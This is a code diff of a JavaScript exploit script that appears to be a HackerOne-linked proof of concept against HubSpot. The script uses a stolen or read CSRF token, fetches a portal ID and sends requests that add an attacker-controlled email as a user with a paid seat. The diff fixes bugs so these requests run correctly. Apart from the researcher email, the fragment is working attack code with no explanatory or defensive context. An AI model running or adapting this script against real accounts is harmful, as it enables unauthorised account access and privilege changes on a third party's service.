@@ -40,7 +40,7 @@
         // ✅ Add CSRF header here
         if (csrfToken) {
           xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
-      }}
+      }
 
         xhr1.onreadystatechange = function () {
           if (xhr1.readyState === XMLHttpRequest.DONE) {
@@ -51,7 +51,7 @@
             let portalId = null;
             try {
               const json = JSON.parse(xhr1.responseText);
-              portalId = json.id || json.id;
+              portalId = json[0]?.id || json.id;
             } catch (e) {
               log("[-] Failed to parse portalId.");
               return;
@@ -70,10 +70,10 @@
             xhr2.setRequestHeader("Content-Type", "application/json");
 
             if (csrfToken) {
-              xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+              xhr2.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
 
             const userData = {
-              "users": [{ "email": "dangerhm+3@wearehackerone.com" }],
+              "users": [{ "email": "dangerhm+5@wearehackerone.com" }],
               "seatNames": ["service-professional-trial"],
               "teamId": null,
               "secondaryTeamIds": [],
@@ -125,7 +125,7 @@
                 xhr3.setRequestHeader("Content-Type", "application/json");
 
                 if (csrfToken) {
-                  xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+                  xhr3.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
 
                 const putData = [{
                   "userId": userId,
